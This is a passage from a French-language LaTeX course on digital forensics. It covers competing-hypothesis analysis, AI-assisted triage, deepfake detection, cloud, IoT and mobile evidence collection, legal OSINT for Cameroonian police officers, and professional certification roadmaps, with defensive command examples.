\label{eq:hypotheses}
\end{equation}

Exemple dans MVOM~: $H_0$ = « Attaque par le groupe LockBit via RDP »..
Hypothèse $H_1$~: « La connexion RDP était légitime (télétravail autorisé)
et le ransomware a été introduit par un autre vecteur ». L'investigateur
doit \textbf{explicitement réfuter} $H_1$ --- en vérifiant la liste des
accès RDP autorisés, les contrats, les bulletins de salaire --- avant
de conclure à $H_0$.

\begin{boiteRemarque}{La méthode ACH (\textit{Analysis of Competing Hypotheses})}
Développée par Heuer pour la CIA \cite{heuer1999}, la méthode ACH formalise
cette approche~: pour chaque hypothèse, construire une matrice hypothèses/preuves
et calculer un score de cohérence. Une hypothèse qui explique toutes les preuves
et ne peut être réfutée par aucune est la conclusion la plus solide. Ce principe
est au cœur du Processus Investigatif Universel du
Chapitre~\ref{chap:PIU}.
\end{boiteRemarque}

% ============================================================================
\section{Synthèse~: Fondements Théoriques et Trilemme CRO}
\label{sec:fondements-cro}
% ============================================================================

\begin{tableaucours}{p{3.5cm}p{2.8cm}p{4.8cm}}{%
    \tableauHeader{Fondement} &
    \tableauHeader{Dim. CRO principale} &
    \tableauHeader{Contribution}
}
Locard numérique & $\mathcal{R}$ &
    Garantit l'existence de traces~; justifie l'exhaustivité de la collecte \\
Entropie de Shannon & $\mathcal{R}$ &
    Détecte les anomalies~; identifie chiffrement et stéganographie \\
Distance Hamming/Levenshtein & $\mathcal{R}$ &
    Mesure la similarité~; identifie variants et falsifications \\
Théorie des graphes & $\mathcal{O}$ &
    Visualise les relations~; cartographie le réseau criminel \\
Modèle Dolev-Yao & $\mathcal{C}$ &
    Modélise la menace adversariale~; justifie le chiffrement des preuves \\
Complexité / hash & $\mathcal{R} + \mathcal{O}$ &
    Fonde mathématiquement l'intégrité et l'authenticité \\
Théorie de la preuve & $\mathcal{O}$ &
    Formalise l'admissibilité et la séparation constat/interprétation \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~4.4 --- Fondements et dimensions CRO}
\end{center}

\begin{boxCRO}
\textbf{La tension fondamentale~:} maximiser $\mathcal{O}$ (transparence,
vérifiabilité) s'oppose à maximiser $\mathcal{C}$ (opacité, chiffrement).
La résolution partielle est apportée par les preuves à divulgation nulle~:
\textit{je prouve que je sais} sans révéler \textit{ce que je sais}.
Ce pont entre $\mathcal{C}$ et $\mathcal{O}$ est le sujet de la Partie~VI.
\end{boxCRO}

\separateur

\begin{boxresume}
\textbf{Ce qu'il faut retenir de ce chapitre~:}

\begin{itemize}
    \item \textbf{Locard numérique}~: quatre niveaux de traces (primaires,
          secondaires, tertiaires, résiduelles). L'anti-forensique laisse
          elle-même des traces secondaires.
    \item \textbf{Théorie de l'information}~: entropie ($H > 7.5$~: chiffré),
          fuzzy hashes (ssdeep) pour les variantes de malware, dnstwist pour
          le typosquatting.
    \item \textbf{Graphes}~: $G = (V,E,w)$ modélise les réseaux criminels~;
          la centralité d'intermédiarité identifie les ponts critiques~;
          les graphes temporels reconstituent les chemins d'attaque.
    \item \textbf{Dolev-Yao}~: adversaire omniscient sur le réseau, impuissant
          contre la cryptographie correcte. Justifie le chiffrement des preuves
          et la signature numérique.
    \item \textbf{Complexité}~: l'algorithme de Shor réduit RSA/ECDSA à
          $\mathcal{O}(n^3)$~; migration vers CRYSTALS-Dilithium/FALCON
          obligatoire pour les données longue durée.
    \item \textbf{Modèles de processus}~: DFRWS (6~phases), NIST SP~800-86
          (Exam./Analysis), ISO~27037 (DEFR/DES). La distinction
          constatation/interprétation est la règle d'or du rapport.
    \item \textbf{Admissibilité formelle}~:
          $\mathrm{Admissible}(P) \iff \mathrm{Légale} \wedge \mathrm{Intègre}
          \wedge \mathrm{Authentique} \wedge \mathrm{Pertinente}$~;
          la conjonction est stricte.
\end{itemize}
\end{boxresume}

\bigskip

\begin{boxexo}[title={\ding{45}\quad Exercice~4.1 --- Entropie et interprétation \niveaubase}]
Trois fichiers extraits d'une image forensique~:
\begin{enumerate}[(a)]
    \item \texttt{rapport\_finance.docx}~: entropie calculée = 4.7~bits/octet.
    \item \texttt{backup\_2026.zip}~: entropie calculée = 7.9~bits/octet.
    \item \texttt{systeme.dll}~: entropie calculée = 6.8~bits/octet.
\end{enumerate}
Pour chaque fichier~: interprétez l'entropie, indiquez si une investigation
approfondie est justifiée, et précisez ce que vous chercheriez.
\end{boxexo}

\begin{boxexo}[title={\ding{45}\quad Exercice~4.2 --- Graphe WOURI \niveaumoyen}]
À partir des éléments de l'Opération WOURI (quatre suspects, deux victimes,
flux de 47M et 32M~FCFA), construisez le graphe $G = (V, E, w)$~:
\begin{enumerate}[(a)]
    \item Définissez précisément $V$, $E$ et $w$.
    \item Calculez la centralité de degré de chaque suspect.
    \item Identifiez le suspect à la plus forte centralité d'intermédiarité
          et justifiez pourquoi sa neutralisation fragmente le réseau.
    \item Proposez quelle preuve supplémentaire permettrait d'ajouter une
          arête directe entre ATANGANA et HASSAN dans le graphe.
\end{enumerate}
\end{boxexo}

\begin{boxexo}[title={\ding{45}\quad Exercice~4.3 --- Admissibilité et ACH \niveauexpert}]
Dans l'affaire MVOM, l'investigateur a écrit dans son rapport~:

\medskip
\textit{« Le processus \texttt{svchost.exe} (PID~4892) était clairement
malveillant et a servi à l'installation du ransomware LockBit par les
attaquants russes. »}
\medskip

\begin{enumerate}[(a)]
    \item Identifiez au moins quatre problèmes dans cette phrase (distinctions
          constatation/interprétation, degré de certitude, attribution).
    \item Réécrivez-la en séparant strictement les constatations vérifiables
          des interprétations, avec un niveau de confiance explicite.
    \item Formulez la méthode ACH~: définissez $H_0$ et deux hypothèses
          concurrentes~; proposez quelle preuve discriminerait entre $H_0$
          et $H_1$.
\end{enumerate}
\end{boxexo}

\bigskip

\begin{boxinfo}
\textbf{Transition.} Le Chapitre~\ref{chap:etat-art} dresse l'état de l'art
de la discipline en 2025~: IA forensique, deepfake detection, forensique de
conteneurs, roadmap des certifications. Il complète la Partie~I avant le
plongeon opérationnel de la Partie~II, qui construit le Processus Investigatif
Universel sur les fondements posés ici.
\end{boxinfo}
      
        % ============================================================================
% Fichier  : partie1/P01_C05_etat_art.tex
% Titre    : Etat de l'Art et Defis Contemporains
% Auteur   : MINKA MI NGUIDJOÏ Thierry Emmanuel
% Version  : 1.0 -- Juin 2026
% Statut   : REDIGE
% Sources  : 4_etat_art.tex, 20_benchmarking.tex, M6_OSINT.docx,
%            6Competences_Techniques_1.PDF, minka2025cro
% ============================================================================

\chapter{État de l'Art et Défis Contemporains}
\label{chap:etat-art}

\epigraph{%
    « La science progresse en faisant danser les faits aux rythmes
    de nouvelles théories. »%
}{--- Marcel Proust}

\niveauChapitre{Fondamental}{%
    Ce chapitre est le dernier de la Partie~I. Il mobilise les concepts
    des chapitres précédents pour cartographier l'état de la discipline
    en 2025--2026 et projeter son évolution à l'horizon 2030.%
}

\begin{boxobjectifs}
\begin{itemize}
    \item Situer les cinq frontières actives de l'investigation numérique
          en 2025--2026 et comprendre les défis spécifiques de chacune.
    \item Analyser la valeur et les limites de l'IA forensique~: LLM pour
          triage, machine learning pour classification de malware,
          deepfake detection.
    \item Comprendre les défis forensiques propres au cloud, à l'IoT et
          au mobile dans le contexte africain et camerounais.
    \item Maîtriser les fondamentaux de l'OSINT légal pour les OPJ~:
          outils, cadre juridique, limites.
    \item Utiliser le framework DICES pour positionner les pratiques
          camerounaises par rapport aux standards mondiaux.
    \item Construire une roadmap de développement professionnel réaliste
          sur 36~mois dans le contexte camerounais.
\end{itemize}
\end{boxobjectifs}

\bigskip

% ============================================================================
\section*{Bilan d'une Discipline en Accélération}
% ============================================================================

La Partie~I de ce cours a posé les fondements~: philosophie, histoire,
affaires fondatrices, théories mathématiques. Ce dernier chapitre de la
Partie~I change de registre~: il décrit ce qui se passe \emph{maintenant},
les défis que la discipline affronte \emph{aujourd'hui}, et les compétences
que vous devrez avoir construites \emph{dans cinq ans}.

\medskip

L'investigation numérique de 2025 n'est plus celle de 2015. Cinq ruptures
simultanées la reconfigurent en profondeur~:
\begin{enumerate}
    \item L'\textbf{IA} entre dans la chaîne d'analyse --- comme outil
          d'accélération du triage et comme vecteur d'attaque sophistiqué.
    \item Les \textbf{deepfakes} brouillent la frontière entre le vrai
          et le fabriqué, forçant la discipline à développer une
          sous-spécialité d'authentification des médias.
    \item Le \textbf{cloud et l'IoT} pulvérisent la notion de scène de
          crime localisée~: les preuves sont partout, souvent éphémères,
          toujours multi-juridictionnelles.
    \item L'\textbf{OSINT} s'est professionnalisé au point d'être une
          compétence à part entière, avec ses outils, son droit et son
          éthique propres.
    \item La \textbf{cryptographie post-quantique} est en cours de
          déploiement~: l'investigateur de demain doit comprendre ce que
          cela change pour la chaîne de preuves.
\end{enumerate}

\separateur

% ============================================================================
\section{IA Forensique~: Puissance et Limites}
\label{sec:ia-forensique}
% ============================================================================

\subsection{L'IA comme accélérateur de triage}

Le triage forensique --- identifier en quelques minutes les artefacts
pertinents parmi des milliers --- est la tâche où l'IA apporte le gain
le plus immédiat. Les \termecle{LLM}\index{LLM forensique}
(\textit{Large Language Models}) peuvent~:
\begin{itemize}
    \item \textbf{Résumer et catégoriser} des volumes d'emails, de journaux
          ou de logs qui dépassent la capacité d'analyse humaine en temps
          raisonnable.
    \item \textbf{Identifier des anomalies linguistiques} dans des
          communications --- syntaxe inhabituelle, traduction automatique,
          incohérences de registre.
    \item \textbf{Générer des hypothèses} à partir d'un corpus de preuves
          hétérogènes~: un LLM peut proposer des connections entre artefacts
          que l'analyste humain n'aurait pas immédiatement vus.
\end{itemize}

\subsection{Classification automatique de malware}

Les approches de machine learning pour la classification de malware
reposent sur trois familles de caractéristiques~:

\begin{tableaucours}{p{3.5cm}p{3.5cm}p{4.5cm}}{%
    \tableauHeader{Approche} &
    \tableauHeader{Caractéristiques} &
    \tableauHeader{Forces / Limites}
}
Statique & Chaînes, imports, sections PE, entropie &
    Rapide, pas d'exécution~; contourné par l'obfuscation \\
Dynamique & Appels système, trafic réseau, comportement &
    Robuste à l'obfuscation~; lent, risque d'environnement sandbox \\
Hybride & Combinaison statique + dynamique &
    Meilleure précision~; coûteux en calcul \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~5.1 --- Approches ML pour la classification de malware}
\end{center}

\subsection{Les limites de l'IA forensique --- la crise d'opposabilité}

L'IA forensique pose une question CRO fondamentale~: si une conclusion
repose sur un modèle opaque, comment la défendre devant un tribunal~?

\begin{boxCRO}
\textbf{Analyse CRO --- IA forensique}

$\mathcal{R}$ (Fiabilité)~: les modèles de ML bien entraînés atteignent
des précisions de 95--99\% sur des jeux de données équilibrés.

$\mathcal{O}$ (Opposabilité)~: \textbf{c'est la crise.} Un avocat de la
défense peut demander l'explication complète du modèle. Si la réponse
est ``le réseau de neurones a attribué une probabilité de 0.97''
sans explication compréhensible, le juge peut refuser la conclusion.
L'arrêt \textit{Loomis v. Wisconsin} (2016) aux États-Unis illustre
ce risque pour les algorithmes de prédiction en justice.

$\mathcal{C}$ (Confidentialité)~: les modèles entraînés sur des données
réelles (cas judiciaires précédents) peuvent mémoriser des informations
sur des affaires passées et les révéler via des attaques par inversion.

\cro{$\downarrow$ risque de fuite}{$\uparrow$ précision technique}{$\downarrow$ crise d'explicabilité}

\textbf{Règle pratique~:} utiliser l'IA pour le \emph{triage} (hypothèses,
orientation), jamais comme \emph{preuve primaire}. L'analyste humain
confirme et documente chaque conclusion de l'IA.
\end{boxCRO}

\begin{boxalert}
\textbf{Règle d'or~: l'IA oriente, l'humain constate.}

En contexte judiciaire camerounais, aucun texte n'autorise encore une
preuve basée uniquement sur un algorithme opaque. L'investigateur doit
systématiquement~: (1)~documenter l'outil utilisé (nom, version,
paramètres), (2)~vérifier manuellement les conclusions de l'IA sur un
échantillon, (3)~présenter la conclusion IA comme \emph{indication}
corroborée par une analyse humaine, jamais comme preuve autonome.
\end{boxalert}

% ============================================================================
\section{Deepfake Detection~: Authentifier les Médias Numériques}
\label{sec:deepfakes}
% ============================================================================

\subsection{Le défi de l'authenticité des médias}

Les \termecle{deepfakes}\index{deepfake} --- vidéos, images, audios générés
ou manipulés par IA --- constituent l'une des menaces forensiques les plus
graves de la décennie. Trois catégories~:
\begin{itemize}
    \item \textbf{Face swap}~: substitution du visage d'une personne par
          celui d'une autre dans une vidéo existante.
    \item \textbf{Voice cloning}~: reproduction convaincante de la voix
          d'une personne à partir d'un échantillon de quelques secondes.
    \item \textbf{Document forgery}~: génération de documents officiels
          (relevés bancaires, identités, contrats) cohérents avec les
          templates réels.
\end{itemize}

\subsection{Méthodes de détection}

Quatre approches complémentaires~:
\begin{enumerate}
    \item \textbf{Analyse de cohérence physique}~: les deepfakes génèrent
          souvent des incohérences dans les reflets des yeux, le
          mouvement des oreilles, la synchronisation labiale.
    \item \textbf{Analyse spectrale}~: les artefacts de compression GAN
          (\textit{Generative Adversarial Network}) laissent des
          signatures dans le domaine fréquentiel (FFT) détectables
          même après recompression.
    \item \textbf{Métadonnées et provenance}~: la
          \termecle{C2PA}\index{C2PA} (\textit{Coalition for Content
          Provenance and Authenticity}) développe un standard de
          signature cryptographique à la capture~: chaque photo prise
          par un appareil certifié porte une signature vérifiable.
    \item \textbf{Analyse comportementale}~: les modèles de langage
          génèrent des textes avec des patterns statistiques spécifiques
          détectables par des outils comme GPTZero ou Binoculars.
\end{enumerate}

\begin{boxartefact}{Vérification d'authenticité d'image -- commandes pratiques}
\textbf{Étape 1 --- Extraction des métadonnées EXIF et C2PA~:}
\begin{lstlisting}[language=bash_forensique]
# ExifTool -- extraction complete
exiftool -a -u -g1 image_suspecte.jpg
# Chercher : Make, Model, GPS, CreateDate, Software
# ALERTE : 'Software: GIMP' sur une photo prétendument originale
# ALERTE : absence de champ GPS sur une photo censée être localisée

# Analyse des erreurs de niveau JPEG (ELA -- Error Level Analysis)
# Disponible via fotoforensics.com ou imagemagick
convert image.jpg -auto-level ela_result.jpg
# Les zones retouchées apparaissent avec un niveau d'erreur différent
\end{lstlisting}

\textbf{Étape 2 --- Analyse spectrale (FFT)~:}
\begin{lstlisting}[language=bash_forensique]
python3 -c \"
import cv2, numpy as np, matplotlib.pyplot as plt
img = cv2.imread('suspect.jpg', 0)
f = np.fft.fft2(img)
fshift = np.fft.fftshift(f)
magnitude = 20*np.log(np.abs(fshift)+1)
plt.imshow(magnitude, cmap='gray')
plt.savefig('spectrum.png')
\"
# Un spectre en croix ou en échiquier indique une génération GAN
\end{lstlisting}
\end{boxartefact}

\begin{boxjuris}
\textbf{Statut juridique des deepfakes au Cameroun~:}

La \loicam{2010/012}, art.~72 (fraude informatique) et art.~71
(modification de données) couvrent la création de documents falsifiés,
y compris les deepfakes à des fins frauduleuses. La \loicam{2024/017},
art.~59 (utilisation frauduleuse des données personnelles) s'applique
lorsque le deepfake utilise le visage ou la voix d'une personne sans
son consentement.
\end{boxjuris}

% ============================================================================
\section{Forensique Cloud, IoT et Mobile~: la Scène de Crime Distribuée}
\label{sec:cloud-iot-mobile}
% ============================================================================

\subsection{Les trois défis structurels du cloud forensique}

La forensique cloud n'est pas une extension de la forensique système~:
c'est une discipline qui doit être repensée. Trois défis fondamentaux~:

\begin{enumerate}
    \item \textbf{Multitenancy}~: les données d'un client sont physiquement
          colocalisées avec celles d'autres clients sur les mêmes serveurs.
          L'investigateur ne peut pas simplement ``saisir le serveur''.

    \item \textbf{Éphéméralité}~: les instances cloud (containers,
          fonctions serverless) durent quelques secondes à quelques minutes.
          Les logs sont supprimés selon des politiques de rotation que
          l'investigateur ne contrôle pas.

    \item \textbf{Multi-juridiction}~: un service hébergé chez AWS peut
          avoir ses données réparties entre des datacenters en Irlande,
          aux États-Unis et à Singapour. Quelle loi s'applique~?
          Le \textit{CLOUD Act} américain (2018) donne aux autorités US
          accès aux données hébergées par des entreprises américaines
          \emph{n'importe où dans le monde}~; cela entre en conflit avec
          la souveraineté de nombreux États.
\end{enumerate}

\begin{boxoutils}{Forensique cloud --- commandes de collecte AWS/Azure}
\textbf{AWS CloudTrail --- journaux d'audit~:}
\begin{lstlisting}[language=bash_forensique]
# Lister les événements récents CloudTrail (30 derniers jours)
aws cloudtrail lookup-events \\
    --lookup-attributes AttributeKey=EventName,AttributeValue=DeleteBucket \\
    --max-results 50

# Exporter les logs d'un bucket S3 spécifique vers l'investigation
aws s3 cp s3://bucket-suspect/logs/ ./evidence/logs/ --recursive
# Calculer les hash immédiatement après téléchargement
sha256sum ./evidence/logs/*
\end{lstlisting}

\textbf{Azure Activity Log~:}
\begin{lstlisting}[language=bash_forensique]
# Lister les activités suspectes sur un abonnement Azure
az monitor activity-log list \\
    --start-time 2026-03-01 \\
    --end-time 2026-03-15 \\
    --query '[?level==`Critical`]' \\
    --output table
\end{lstlisting}
\end{boxoutils}

\subsection{IoT forensique~: l'explosion des surfaces de collecte}

Selon Cisco, plus de 29~milliards d'appareils IoT seront connectés en 2030.
Chacun est potentiellement une scène de crime~: routeur compromis, caméra IP,
montre connectée, véhicule, thermostat intelligent. Les défis~:

\begin{itemize}
    \item \textbf{Hétérogénéité}~: chaque fabricant utilise un système
          d'exploitation propriétaire. Les outils forensiques génériques
          (Autopsy, FTK) ne fonctionnent pas sur un firmware TP-Link.
    \item \textbf{Volatilité extrême}~: beaucoup d'appareils IoT ne
          conservent leurs logs qu'en RAM ou dans un buffer circulaire
          de quelques heures.
    \item \textbf{Extraction physique}~: certains appareils exigent
          une extraction via UART, JTAG ou chip-off --- des techniques
          matérielles qui nécessitent un équipement spécialisé.
\end{itemize}

\begin{boxscenario}{Caméra IP dans une affaire d'homicide --- Yaoundé, fictif}
Une caméra de vidéosurveillance IP a enregistré l'entrée d'un suspect dans
un immeuble le soir d'un homicide. L'immeuble utilise un système Hikvision.
La caméra est connectée à un NVR (enregistreur réseau).

\textbf{Procédure forensique~:}
\begin{enumerate}
    \item Identifier le modèle du NVR et son interface d'administration.
    \item Extraire les séquences vidéo via l'interface web ou via
          l'outil dédié (IVMS-4200 pour Hikvision).
    \item Calculer le hash de chaque fichier vidéo extrait.
    \item Documenter les paramètres de la caméra (heure système,
          synchronisation NTP~; un décalage horaire fausse tout
          témoignage basé sur la vidéo).
\end{enumerate}

\textbf{Attention CRO~:} \cro{$\sim$}{$\uparrow$ si hash documenté}{$\sim$ dépend horloge}
Le décalage horaire est le piège le plus fréquent des vidéos de
surveillance~: sans synchronisation NTP documentée, l'heure affichée
peut être fausse de plusieurs heures.
\end{boxscenario}

\subsection{Mobile forensique~: spécificités africaines}

En Afrique subsaharienne, le mobile est le premier vecteur de services
numériques (banque, communication, commerce). La forensique mobile y est
donc disproportionnellement centrale. Quatre niveaux d'acquisition selon
\norme{NIST SP~800-101r1}~:

\begin{tableaucours}{p{3.0cm}p{3.0cm}p{5.5cm}}{%
    \tableauHeader{Niveau} &
    \tableauHeader{Technique} &
    \tableauHeader{Données accessibles}
}
Niveau~1 & Extraction manuelle & Photos, contacts, SMS visibles à l'écran \\
Niveau~2 & Extraction logique (ADB) &
    Fichiers accessibles du système de fichiers, bases SQLite applications \\
Niveau~3 & Extraction physique &
    Image complète de la mémoire flash~; données supprimées récupérables \\
Niveau~4 & Chip-off / JTAG &
    Extraction directe de la puce mémoire~; dernier recours \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~5.2 --- Niveaux d'acquisition mobile}
(NIST SP~800-101r1)}\end{center}

% ============================================================================
\section{OSINT~: Renseignement en Source Ouverte}
\label{sec:osint}
% ============================================================================

\subsection{Définition, périmètre et cadre légal camerounais}

L'\termecle{OSINT}\index{OSINT} (\textit{Open Source Intelligence}) désigne
la collecte et l'analyse d'informations issues de sources légalement
accessibles au public~: sites web, réseaux sociaux, bases WHOIS, registres
officiels, archives, publications scientifiques.

\begin{boxjuris}
\textbf{Cadre légal OSINT au Cameroun~:}
\begin{itemize}
    \item Art.~41 \loicam{2010/012}~: droit au respect de la vie privée.
          L'OSINT ne couvre que les informations \emph{volontairement}
          rendues publiques par leur sujet.
    \item Art.~9 \loicam{2024/017}~: la collecte systématique (fichage)
          et le croisement avec des données non publiques peuvent
          entrer en conflit avec le principe de finalité déterminée.
    \item \textbf{Règle pratique~:} documenter dans chaque rapport OSINT
          la source exacte et la date de consultation. Une capture d'écran
          horodatée est indispensable --- un lien public aujourd'hui peut
          être privé à l'audience.
    \item \textbf{Infiltration en ligne~:} se faire passer pour quelqu'un
          d'autre en ligne pour obtenir des informations constitue une
          provocation ou surveillance couverte~; elle requiert une
          autorisation judiciaire et sort du cadre OSINT.
\end{itemize}
\end{boxjuris}

\subsection{Le cycle OSINT pour les OPJ}

Le cycle OSINT structuré en cinq étapes~:
\begin{enumerate}
    \item \textbf{Planification}~: définir la cible et les questions
          clés. Qu'est-ce que j'ignore et que je dois trouver~?
    \item \textbf{Collecte}~: identifier et exploiter les sources
          pertinentes (réseaux sociaux, WHOIS, enregistrements publics).
    \item \textbf{Traitement}~: organiser, filtrer, supprimer les doublons.
    \item \textbf{Analyse}~: recouper, vérifier, tirer des conclusions.
    \item \textbf{Diffusion}~: produire un rapport utilisable par le
          magistrat instructeur.
\end{enumerate}

\subsection{Boîte à outils OSINT pour les OPJ camerounais}

\begin{tableaucours}{p{2.8cm}p{2.5cm}p{6.0cm}}{%
    \tableauHeader{Outil} &
    \tableauHeader{Usage principal} &
    \tableauHeader{Application forensique}
}
Sherlock & Recherche de pseudo & Identifier tous les comptes d'une personne
    à partir d'un username (cas WOURI~: \texttt{duke\_cyber\_ng}) \\
WHOIS / dig & Infrastructure & Propriétaire d'un domaine~; serveurs DNS~;
    enregistrement d'un domaine de phishing \\
crt.sh & Certificats SSL & Trouver tous les sous-domaines d'un domaine~;
    identifier des sites de phishing (ex~: \texttt{*.uba-cameroun.com}) \\
dnstwist & Typosquatting & Générer et vérifier les variantes d'un domaine
    légitime \\
Shodan & Appareils exposés & Identifier des caméras, serveurs, IoT
    vulnérables associés à une cible \\
ExifTool & Métadonnées & GPS dans les photos, auteur, appareil~;
    localiser un suspect via ses publications Instagram \\
Blockchair & Blockchain & Tracer les transactions Bitcoin~;
    identifier les adresses de mixeurs (cas WOURI) \\
Maltego & Graphe de relations & Cartographier visuellement les connexions
    entre entités (personnes, domaines, IPs) \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~5.3 --- Boîte à outils OSINT pour les OPJ}
\end{center}

\begin{lstlisting}[language=bash_forensique,
    caption={Workflow OSINT complet --- cible fictive KOUAME Narcisse}]
# 1. Recherche de pseudo identifié (@koffi_biz_225)
sherlock koffi_biz_225
# -> identifie comptes Telegram, Instagram, Twitter/X

# 2. Reverse image search via exiftool si photo disponible
exiftool photo_profil.jpg | grep -i 'GPS\|Make\|Date'

# 3. Infrastructure : domaine utilisé pour le phishing
whois medequip-portugal.com
dig medequip-portugal.com ANY
crt.sh : medequip-portugal.com  # via navigateur

# 4. Adresses Bitcoin du réseau
# -> Blockchair.com : entrer l'adresse, visualiser le graphe de transactions
# -> Identifier les exchanges (Binance, Kraken) : portail LEA disponible

# 5. Maltego : cartographier les connexions
# Entités : KOUAME, @koffi_biz_225, +225 07XXXXXX,
#           medequip-portugal.com, 3 adresses BTC
\end{lstlisting}

% ============================================================================
\section{Benchmarking Mondial~: le Framework DICES}
\label{sec:dices}
% ============================================================================

\subsection{Le framework DICES}

Le framework \termecle{DICES}\index{DICES, framework} (\textbf{D}octrine,
\textbf{I}nfrastructure, \textbf{C}apacités, \textbf{E}cosystème,
\textbf{S}tratégie) permet de comparer les pratiques forensiques de
différentes juridictions sur cinq axes \cite{dfrws2001}~:
\begin{itemize}
    \item \textbf{D}octrine~: philosophie et approche conceptuelle
          (empirisme pragmatique ou rigueur formelle~?)
    \item \textbf{I}nfrastructure~: moyens techniques et organisationnels
          (laboratoires, équipements, plateformes cloud)
    \item \textbf{C}apacités~: compétences humaines et processus
          (formations, certifications, procédures standardisées)
    \item \textbf{E}cosystème~: environnement juridique et institutionnel
          (lois, tribunaux, organismes de régulation)
    \item \textbf{S}tratégie~: vision prospective et adaptation
          (investissements R\&D, coopération internationale)
\end{itemize}

\subsection{Positionnement comparatif}

\begin{tableaucours}{p{2.4cm}p{2.0cm}p{2.0cm}p{2.0cm}p{2.0cm}p{2.0cm}}{%
    \tableauHeader{Axe DICES} &
    \tableauHeader{USA/FBI} &
    \tableauHeader{Europe} &
    \tableauHeader{Afrique du Sud} &
    \tableauHeader{Nigeria} &
    \tableauHeader{Cameroun}
}
Doctrine & Empirisme & Droit civil & Mixte & Common law & Droit civil fr. \\
Infrastructure & $\bullet\bullet\bullet\bullet\bullet$ & $\bullet\bullet\bullet\bullet$ &
    $\bullet\bullet\bullet$ & $\bullet\bullet$ & $\bullet\bullet$ \\
Capacités & $\bullet\bullet\bullet\bullet\bullet$ & $\bullet\bullet\bullet\bullet$ &
    $\bullet\bullet\bullet$ & $\bullet\bullet$ & $\bullet\bullet$ \\
Ecosystème & CFAA + FRE & RGPD + Budapest & RICA & Budapest & Loi 2010 \\
Stratégie & IA + quantique & ENISA + C2PA & SAPS-DCI & EFCC & ANTIC \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~5.4 --- Comparaison DICES~: $\bullet$ = niveau de maturité}
\end{center}

\subsection{Atouts et lacunes du Cameroun~: une lecture honnête}

\textbf{Atouts réels~:}
\begin{itemize}
    \item Un cadre législatif complet et récent~: \loicam{2010/012} et
          \loicam{2024/017} couvrent les infractions numériques et la
          protection des données.
    \item L'ANTIC, institution fonctionnelle et présente dans les enquêtes.
    \item Une communauté technique en formation rapide (ENSP, Universités,
          entreprises privées).
    \item Une expérience terrain sur les fraudes MoMo~: le Cameroun forme
          ses propres enquêteurs sur des cas réels, pas des simulations.
\end{itemize}

\textbf{Lacunes à combler~:}
\begin{itemize}
    \item Absence de laboratoire forensique accrédité au niveau national.
    \item Faible infrastructure de partage de renseignements cyber
          (\textit{threat intelligence}) entre les institutions.
    \item Jurisprudence numérique naissante~: peu de décisions de justice
          commentées et publiées sur la preuve numérique.
    \item Ressources d'investigation en langue française et en contexte
          africain~: c'est précisément le vide que ce cours est conçu pour
          combler.
\end{itemize}

% ============================================================================
\section{Roadmap de Développement Professionnel}
\label{sec:roadmap}
% ============================================================================

\subsection{Les certifications de référence mondiales}

\begin{tableaucours}{p{3.0cm}p{2.5cm}p{3.0cm}p{3.0cm}}{%
    \tableauHeader{Certification} &
    \tableauHeader{Niveau} &
    \tableauHeader{Spécialité} &
    \tableauHeader{Coût estimé}
}
GIAC GCFE & Intermédiaire & Forensique Windows & 7~000~USD \\
GIAC GCFA & Avancé & Incident Response & 7~000~USD \\
GIAC GREM & Expert & Malware RE & 7~000~USD \\
EnCE & Intermédiaire & EnCase (outil) & 3~000~USD \\
OSCP & Avancé & Pentest & 1~500~USD \\
CompTIA CySA+ & Intermédiaire & Analyse cyber & 400~USD \\
Cellebrite CCPA & Intermédiaire & Mobile forensique & Variable \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~5.5 --- Certifications forensiques de référence
(d'après \cite{competences2024})}\end{center}

\subsection{Roadmap réaliste sur 36 mois en contexte camerounais}

\begin{tableaucours}{p{2.5cm}p{2.2cm}p{7.0cm}}{%
    \tableauHeader{Phase} &
    \tableauHeader{Durée} &
    \tableauHeader{Objectifs et activités}
}
Phase~1 --- Socle & Mois 1--6 &
    Maîtrise de Kali Linux, Autopsy, FTK~Imager, Volatility~3.
    Réalisation de 20~scénarios de laboratoire (images forensiques fournies).
    Lecture de ce cours. Obtention CompTIA CySA+ si financement disponible. \\
Phase~2 --- Spécialisation & Mois 7--18 &
    Choisir une spécialité~: (a)~forensique judiciaire (droit +
    procédure), (b)~réponse aux incidents (cloud + SIEM),
    (c)~forensique mobile (Android/iOS). Participation aux CTF forensiques
    (CyberDefenders, BlueTeamLabs). Contribution à 3~investigations réelles
    (stage ou DGSN). \\
Phase~3 --- Excellence & Mois 19--36 &
    Préparation GIAC GCFE ou GCFA. Rédaction d'un article technique
    sur un cas camerounais. Contribution à l'élaboration de procédures
    standardisées pour l'ANTIC ou la DGSN. \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~5.6 --- Roadmap 36~mois en contexte camerounais}
\end{center}

\begin{boxPNC}
\textbf{Ressources gratuites accessibles depuis le Cameroun~:}
\begin{itemize}
    \item \textbf{CyberDefenders.org}~: laboratoires forensiques avec
          images disque, captures réseau, fichiers mémoire. Niveaux
          Débutant à Expert. Gratuit.
    \item \textbf{BlueTeamLabsOnline.com}~: scénarios de réponse aux
          incidents. Gratuit pour les niveaux de base.
    \item \textbf{HackTheBox / DFIR Track}~: challenge forensique mensuel.
    \item \textbf{SANS Cyber Aces}~: cours de fondamentaux gratuit.
    \item \textbf{GitHub/volatility3}~: documentation officielle avec
          exemples d'analyse mémoire.
    \item \textbf{Journal of Digital Forensics, Security and Law}~:
          accès ouvert~; articles académiques en forensique.
\end{itemize}
\end{boxPNC}

% ============================================================================
\section{Synthèse~: la Carte de la Discipline en 2025--2026}
\label{sec:synthese-etat-art}
% ============================================================================

Ce chapitre clôt la Partie~I. La figure ci-dessous synthétise la carte
de la discipline telle qu'elle se présente en 2025--2026~:

\begin{figure}[H]
\centering
\begin{tikzpicture}[
    domaine/.style={
        draw=CouleurPrimaire, fill=CouleurDef, rounded corners=5pt,
        minimum width=3.0cm, minimum height=0.85cm,
        font=\small\bfseries\color{CouleurPrimaire}, align=center
    },
    defi/.style={
        draw=CouleurBordAlerte, fill=CouleurAlerte, rounded corners=4pt,
        minimum width=2.8cm, minimum height=0.75cm,
        font=\footnotesize\color{CouleurBordAlerte}, align=center
    },
    coeur/.style={
